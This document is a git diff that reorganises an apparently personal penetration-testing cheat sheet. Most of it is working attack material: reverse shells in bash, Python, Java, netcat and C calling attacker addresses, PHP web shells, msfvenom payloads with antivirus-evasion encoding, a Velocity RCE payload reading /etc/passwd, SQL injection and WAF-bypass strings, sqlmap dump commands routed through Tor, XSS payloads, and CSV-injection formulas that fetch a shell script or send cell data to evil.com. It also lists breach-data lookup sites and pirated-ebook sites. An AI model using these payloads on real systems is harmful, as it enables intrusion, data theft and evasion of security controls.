@@ -1,6 +1,12 @@
+### Some website for scan vulnerability
+- https://securityheaders.io/
+
+### Awsome command
+```
 ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
 nslookup `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
 
+java -jar <jar-file-name>.jar
 
 PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
 
@@ -9,37 +15,10 @@ Turn off defender - Set-MpPreference -DisableRealtimeMonitoring $false
 
 python2 -m SimpleHTTPServer + port(default 8000)
 python3 -m http.server + port(default 8000)
+```
 
- • https://leak.sx
- • http://scylla.sh
- • https://intelx.io
- • https://4iq.com
- • https://leaked.site
- • https://hashes.org
- • https://leakcheck.io
- • https://vigilante.pw
- • https://leakcheck.net
- • https://weleakinfo.to
- • https://leakcorp.com
- • https://leakpeek.com
- • https://rslookup.com
- • https://snusbase.com
- • https://ghostproject.fr
- • https://leakedsource.ru
- • https://leak-lookup.com
- • https://nuclearleaks.com
- • https://private-base.info
- • https://haveibeensold.app
- • https://breachchecker.com
- • https://www.dehashed.com
- • http://scatteredsecrets.com
- • https://haveibeenpwned.com
- • https://services.normshield.com
- • https://joe.black/leakengine.html
-
-
-
-===========Open-source intelligence (OSINT)================
+### Open-source intelligence (OSINT)
+```
 assetfinder -subs-only http://paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
 
 rush -j100 -i bitquark-subdomains-top100000.txt 'curl -s -L "https://dns.google.com/resolve?name{}.tesla.com&type=A&cd=true" | sed "s#\"#\n#g;s# #\n#g" | grep "tesla"' | sed 's#\.$##g' | anew teslaDomains 
@@ -71,8 +50,37 @@ wget -nv -nc https://chaos-data.projectdiscovery.io/playstation.zip ; unzip http
 wget https://chaos-data.projectdiscovery.io/lime.zip -nv ; unzip http://lime.zip ; cat *.txt >> lime.txt ; cat lime.txt | httpx -silent -threads 200 | gau -subs -retries 2| anew | rush -j 3 'jaeles scan -s /jaeles-signatures/ -u {}'
 
 findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
+```
 
+--link--
 
+- https://leak.sx
+- http://scylla.sh
+- https://intelx.io
+- https://4iq.com
+- https://leaked.site
+- https://hashes.org
+- https://leakcheck.io
+- https://vigilante.pw
+- https://leakcheck.net
+- https://weleakinfo.to
+- https://leakcorp.com
+- https://leakpeek.com
+- https://rslookup.com
+- https://snusbase.com
+- https://ghostproject.fr
+- https://leakedsource.ru
+- https://leak-lookup.com
+- https://nuclearleaks.com
+- https://private-base.info
+- https://haveibeensold.app
+- https://breachchecker.com
+- https://www.dehashed.com
+- http://scatteredsecrets.com
+- https://haveibeenpwned.com
+- https://services.normshield.com
+- https://joe.black/leakengine.html
+- https://www.social-searcher.com/
 
 dnscmd <ServerName> /Config /NoRecursion {1|0}
 q5MmE8;2X'877q=g9MjzfB@4NAZ[Nw8K
@@ -80,15 +88,17 @@ RD /S /Q %SystemDrive%\windows.old
 
 $env:Path += ";C:\Python27\Scripts"
 
-SEarch
-https://securityheaders.io/
-https://www.social-searcher.com/
-http://sanddroid.xjtu.edu.cn:8080/
-https://b-ok.org/
-https://www.pdfdrive.com/
-http://www.allitebooks.org/
+### Search Book
+- https://b-ok.org/
+- https://www.pdfdrive.com/
+-  http://www.allitebooks.org/
+- b-ok.cc : https://b-ok.cc/
+- b-ok2.org :  https://b-ok2.org/
+- booksc : https://booksc.xyz/
+ư◾️ https://ebookpdf.com
 
-RCE
+### RCE
+```
 %23set($x=%27%27)
 +%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))
 +%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/etc/passwd%27))
@@ -98,36 +108,36 @@ RCE
 curl -fsSI "https://web.archive.org/save/<url>" | grep content-location | awk '{printf ("https://web.archive.org%s\n", $2)}'
 
 head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '
+```
+
+### Best Temporary mailbox (Updates)
+- https://www.guerrillamail.com/en/
+- https://10minutemail.com
+- https://www.trash-mail.com/inbox/
+- https://www.mailinator.com
+- http://www.yopmail.com/en
+- https://generator.email
+- https://en.getairmail.com
+- http://www.throwawaymail.com/en
+- https://maildrop.cc
+- https://owlymail.com/en
+- https://www.moakt.com
+- https://tempail.com
+- http://www.yopmail.com
+- https://temp-mail.org/en
+- https://www.mohmal.com 👍🏻 Best options
+- http://od.obagg.com 👍🏻 Best options
+- http://onedrive.readmail.net 👍🏻 Best options
+- http://xkx.me 👍🏻 Best options
+- https://t.odmail.cn 👍🏻 ( you can register email from Microsoft and get 5TB onedrive Office365 )
+- https://www.emailondeck.com
+- https://smailpro.com
+- https://anonbox.net
+- https://M.kuku.lu
 
 
-Best Temporary mailbox (Updates)🔰
-➖https://www.guerrillamail.com/en/
-➖https://10minutemail.com
-➖https://www.trash-mail.com/inbox/
-➖https://www.mailinator.com
-➖http://www.yopmail.com/en
-➖https://generator.email
-➖https://en.getairmail.com
-➖http://www.throwawaymail.com/en
-➖https://maildrop.cc
-➖https://owlymail.com/en
-➖https://www.moakt.com
-➖https://tempail.com
-➖http://www.yopmail.com
-➖https://temp-mail.org/en
-➖https://www.mohmal.com 👍🏻 Best options
-➖ http://od.obagg.com 👍🏻 Best options
-➖http://onedrive.readmail.net 👍🏻 Best options
-➖http://xkx.me 👍🏻 Best options
-➖ https://t.odmail.cn 👍🏻 ( you can register email from Microsoft and get 5TB onedrive Office365 )
-➖ https://www.emailondeck.com
-➖ https://smailpro.com
-➖ https://anonbox.net
-➖ https://M.kuku.lu
-
-
-*Some Rate Limit Bypass Headers* :
-
+### Some Rate Limit Bypass Headers
+```
 X-Originating-IP: 127.0.0.1
 X-Forwarded-For: 127.0.0.1
 X-Remote-IP: 127.0.0.1
@@ -139,36 +149,12 @@ Forwarded: 127.0.0.1
 X-Forwarded-By: 127.0.0.1
 X-Forwarded-For-IP: 127.0.0.1
 X-True-IP: 127.0.0.1
-
+```
 
 curl -v -H “Authorization: Bearer <jwt_token>” https://<master_ip>:<port>/api/v1/namespaces/default/pods/
 /default/secrets/
 /default/deployments
 /default/daemonsets
-
-The Best website for Download Ebook🔰
-
-Ⓜ️ 
-
-◾️PDFdrive : https://www.pdfdrive.com 
-◾️ b-ok.cc : https://b-ok.cc/
-◾️ b-ok2.org :  https://b-ok2.org/
-◾️ booksc : https://booksc.xyz/
-◾️ AudioBook :  http://audiobookbay.nl
-◾️ Library Genesis2M : http://gen.lib.rus.ec
-◾️ https://sanet.st/
-◾️ https://libgen.me/
-◾️ http://bookfi.net/
-◾️ https://ebookpdf.com
-
-
-
-python sqlmap.py -u
-"http://localhost/storefrontB2CWEB/cart.do?action=cart_add&itm_id=1"
--p itm_id --dbms=mssql --level=5 --risk=3
---tamper=between,space2comment -o --random-agent --parse-errors
---os-shell --technique=ES
-
 
 
 Reverse SSL shell openssl - @ThemsonMester
@@ -180,6 +166,8 @@ mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <HO
 ===========Linux Command Privilege Escalation Exploit================
 uname \"$(bash -c \\\"$(wget http://example.com/file )\\\")\"
 
+### Nmap command
+```
 nmap -vv -Pn --script http-slowloris-check 
 nmap -vv -Pn --script http-iis-short-name-brute
 nmap -sV --script=banner --script ssl-enum-ciphers --script http-slowloris-check  --script smb-enum-shares.nse --script ssl-dh-params
@@ -230,9 +218,16 @@ nmap target --script whois-ip --script-args whodb=nocache
 nmap target --script whois-ip --script-args whois.whodb=nocache
 
 nmap --script whois-domain.nse <target>
+```
 
 
-=======================SQLMAP Bypass Waf=====================================
+### SQLMAP Bypass Waf
+```
+python sqlmap.py -u
+"http://localhost/storefrontB2CWEB/cart.do?action=cart_add&itm_id=1"
+-p itm_id --dbms=mssql --level=5 --risk=3
+--tamper=between,space2comment -o --random-agent --parse-errors
+--os-shell --technique=ES
 
 -u "http://localhost/vuln/test.php?feature=music&song=1" -p song
 -u "http://localhost/vuln/test.php?feature=music&song=1" -p 'song,feature'
@@ -283,11 +278,10 @@ sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=apostrophemask,ap
 --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns
  
 --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump
+```
 
-============================================================================
-
-========================SQL injection ===============================================
-
+### SQL injection
+```
 MYSQL INJECTION - BYPASS UNION SELECT (WAF)
 WHAT IS BYPASS : when target having WAF (web application firewall) secure encption or security on there server its cannot be directly get any vulnerble columns or its cannot be injeCted! so there haCker try to put diffrent query in combined charachaters encrpted,encoded,modifyed sql query parameters like one called UNION SELECT or UNION ALL SELECT!
 there is all types of waf bypass method for bypass union select!
@@ -344,14 +338,11 @@ id=1337 and 1=(select 1 from information_schema.table_constraints where table_na
 *****ASP .NET
 ' and 1=(select cast(concat(db_name(),0x3a,0x3a,table_name,0x0a) as varchar(8000)) from information_schema.tables for xml path('')) — -+
 'AND 1=(select cast(concat(db_name(),0x3a,0x3a,table_name,0x0a) as varchar(8000)) from information_schema.tables for xml path('')) or '1'='
+```
 
-==========================================================================
 
-
-java -jar <jar-file-name>.jar
-
-xss
-========================
+### XSS
+```
 javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 javascript://comment%0a%0dalert(0);
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
@@ -501,34 +492,37 @@ Limited case Akamai WAF bypass:
 Limited case Akamai WAF bypass:
 <div class=xhzeem*/eval?.(value+/()/.source)//"><input value=confirm autofocus onfocus='/*""></div>
 // Works in cases where there are multiple reflection points. Don't forget to URL encode the [+] => [%2B] symbol if it's a GET parameter
-
-
---------------------------------------------------------------------     
-php: 
-# Execute one command
+```
+ 
+### PHP
+Execute one command
+```
 <?php system("whoami"); ?>
 <?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?># Take input from the url paramter. shell.php?cmd=whoami
 <?php system($_GET['cmd']); ?>
 <?php echo shell_exec($_GET["cmd"]); ?>
 <? passthru($_GET["cmd"]); ?>
 php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
-<?php $c=$_GET[‘c’]; echo `$c`; ?># The same but using passthru
+<?php $c=$_GET[‘c’]; echo '$c'; ?># The same but using passthru
 <?php passthru($_GET['cmd']); ?># For shell_exec to output the result you need to echo it
 <?php echo shell_exec("whoami");?># preg_replace(). This is a cool trick
 <?php preg_replace('/.*/e', 'system("whoami");', ''); ?># Using backticks
-<?php $output = `whoami`; echo "<pre>$output</pre>"; ?># Using backticks
-<?php echo `whoami`; ?># upload nc.php
+<?php $output = 'whoami'; echo "<pre>$output</pre>"; ?># Using backticks
+<?php echo 'whoami'; ?># upload nc.php
 <?php echo system("nc -lvp 81 -e cmd.exe");?>
-# upload nc.exe
-# run nc.php on browser--------------------------------------------------------------------
-Bash:
+```
+
+### Using NC
+Bash
+```
 0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 bash -i >& /dev/tcp/<your ip>/<your port> 0>&1
 nc -nlvp 443
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> <your port> >/tmp/f
---------------------------------------------------------------------
+```
 python:
+```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'import socket,subprocess,os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect(("10.0.0.1",1234));
@@ -536,13 +530,16 @@ os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1); 
 os.dup2(s.fileno(),2);
 p=subprocess.call(["/bin/sh","-i"]);
---------------------------------------------------------------------
-Java:
+```
+Java
+```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
---------------------------------------------------------------------netcat:
+```
+netcat:
 # netcat bind shell
+```
 nc -vlp 5555 -e /bin/bash
 nc 192.168.1.101 5555# netcat reverse shell
 nc -lvp 5555
@@ -550,49 +547,66 @@ nc 192.168.1.101 5555 -e /bin/bash# With -e flag
 nc -e /bin/sh <your ip> <your port># Without -e flag
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
---------------------------------------------------------------------C
+```
+--------------------------------------------------------------------
+```
 #include <stdlib.h>
 int main () {
 system("nc.exe -e cmd.exe <myip> <myport>");
 return 0;
 }
+```
 --------------------------------------------------------------------
+
+### Msfvenom
 
 Msfvenom
-
---------------------------------------------------------------------
-Msfvenom: 
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -o shell_reverse.exe
---------------------------------------------------------------------to avoid AV detection, use encryption:
+```
+to avoid AV detection, use encryption
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
---------------------------------------------------------------------php:
+```
+php
+```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.php
---------------------------------------------------------------------
-asp: 
+```
+asp
+```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<your port> -f asp > shell.asp
---------------------------------------------------------------------war:
+```
+war
+```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f war > shell.war
---------------------------------------------------------------------JSP:
+```
+JSP
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.jsp
---------------------------------------------------------------------binary:
+```
+binary
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
---------------------------------------------------------------------List linux meterpreter payloads:
+```
+List linux meterpreter payloads
+```
 msfvenom --list | grep xxxx
---------------------------------------------------------------------Send linux shell to meterpreter:
+```
+Send linux shell to meterpreter
+```
 msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf -o msf.bin (set multi handler then)
---------------------------------------------------------------------
+```
 
 
 
-CSV Injection - At present, the best defense strategy we are aware of is prefixing cells that start with ‘=’ , ‘+’ or ‘-’ with an apostrophe. 
-------------------------------------------
+### CSV Injection - At present, the best defense strategy we are aware of is prefixing cells that start with ‘=’ , ‘+’ or ‘-’ with an apostrophe. 
+```
 @SUM(1+9)*cmd|' /C calc'!A0
 =cmd|’/C calc.exe’!Z0
 =cmd|’/Cpowershell Import-Module BitsTransfer; Start-BitsTransfer - source https://141.io/shell.ps; Invoke-Item shell.ps;’!z
 =cmd|’/Ccalc.exe’!z
 =HYPERLINK(“http://evil.com?x="&A3&","&B3&"[CR]","Error fetching info: Click me to resolve.”)
-
+```
  
-XXE
-------------------------------------------
+### XXE
+```
 <fkpxmlns="http://a.b/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xsi:schemaLocation="http://a.b/http://wiiyjpk3neg58qeu4vb5j8vpcgi86x.burpcollaborator.net/fkp.xsd">fkp</fkp>
+```
